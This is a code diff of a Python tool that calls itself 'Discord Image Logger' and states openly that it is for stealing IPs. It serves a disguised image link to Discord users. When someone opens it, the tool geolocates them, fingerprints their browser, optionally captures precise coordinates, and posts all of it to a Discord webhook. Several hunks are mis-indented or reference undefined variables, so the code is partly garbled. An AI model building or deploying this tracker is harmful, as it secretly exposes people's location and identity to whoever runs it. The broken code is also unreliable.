@@ -5,10 +5,6 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
-
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
@@ -70,7 +66,6 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
-
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
@@ -80,39 +75,37 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [
-            {
-                "title": "Image Logger - Error",
-                "color": config["color"],
-                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-            }
-        ],
-    })
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
     
     if bot:
-        if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content": "",
-                "embeds": [
-                    {
-                        "title": "Image Logger - Link Sent",
-                        "color": config["color"],
-                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-                    }
-                ],
-            }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
+            "color": config["color"],
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
-
 
     ping = "@everyone"
 
@@ -143,16 +136,17 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
         if config["antiBot"] == 1:
                 ping = ""
 
+
     os, browser = httpagentparser.simple_detect(useragent)
     
     embed = {
-        "username": config["username"],
-        "content": ping,
-        "embeds": [
-            {
-                "title": "Image Logger - IP Logged",
-                "color": config["color"],
-                "description": f"""**A User Opened the Original Image!**
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
@@ -160,12 +154,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Hostname:** `{info['hostname'] if 'hostname' in info else 'Unknown'}`
-> **Connection Type:** `{info['connectionType'] if 'connectionType' in info else 'Unknown'}`
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **Last Seen:** `{info['last_seen'] if 'last_seen' in info else 'Unknown'}`
-> **Organization:** `{info['org'] if info['org'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
 > **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
@@ -173,12 +163,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**Browser Info:**
+**PC Info:**
 > **OS:** `{os}`
-> **OS Version:** `{os_version if 'os_version' in info else 'Unknown'}`
 > **Browser:** `{browser}`
-> **User Agent:** `{user_agent if 'user_agent' in info else 'Unknown'}`
-
 
 **User Agent:**
 ```
@@ -187,18 +174,20 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     }
   ],
 }
-            
-   if url:
-        embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json=embed)
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
     return info
 
 binaries = {
-   "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
     def handleRequest(self):
         try:
             if config["imageArgument"]:
@@ -223,58 +212,51 @@ background-size: contain;
 width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
-
-            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
+            
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
-
+            
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
-                self.end_headers()
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
 
-                if config["buggedImage"]:
-                    self.wfile.write(binaries["loading"])
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
                 return
-
+            
             else:
                 s = self.path
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
 
-                    
-                 message = config["message"]["message"]
-                 
-       if config["message"]["richMessage"] and result:
-message = message.replace("{ip}", ip if ip else 'Unknown')
-message = message.replace("{isp}", info['isp'] if info['isp'] else 'Unknown')
-message = message.replace("{asn}", info['as'] if info['as'] else 'Unknown')
-message = message.replace("{hostname}", info['hostname'] if 'hostname' in info else 'Unknown')
-message = message.replace("{connectionType}", info['connectionType'] if 'connectionType' in info else 'Unknown')
-message = message.replace("{country}", info['country'] if info['country'] else 'Unknown')
-message = message.replace("{region}", info['regionName'] if info['regionName'] else 'Unknown')
-message = message.replace("{last_seen}", info['last_seen'] if 'last_seen' in info else 'Unknown')
-message = message.replace("{org}", info['org'] if info['org'] else 'Unknown')
-message = message.replace("{city}", info['city'] if info['city'] else 'Unknown')
-message = message.replace("{coords}", str(info['lat']) + ', ' + str(info['lon']) if not coords else coords.replace(',', ', '))
-message = message.replace("{coords_info}", 'Approximate' if not coords else f'Precise, [Google Maps](https://www.google.com/maps/search/google+map++{coords})')
-message = message.replace("{timezone}", info['timezone'].split('/')[1].replace('_', ' '))
-message = message.replace("{timezone_region}", info['timezone'].split('/')[0])
-message = message.replace("{mobile}", info['mobile'])
-message = message.replace("{vpn}", info['proxy'])
-message = message.replace("{bot}", info['hosting'] if info['hosting'] and not info['proxy'] else ('Possibly' if info['hosting'] else 'False'))
-message = message.replace("{os}", os)
-message = message.replace("{os_version}", info['os_version'] if 'os_version' in info else 'Unknown')
-message = message.replace("{browser}", browser)
-message = message.replace("{user_agent}", info['user_agent'] if 'user_agent' in info else 'Unknown')
+                message = config["message"]["message"]
 
-  datatype = 'text/html'
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
 
                 if config["message"]["doMessage"]:
                     data = message.encode()
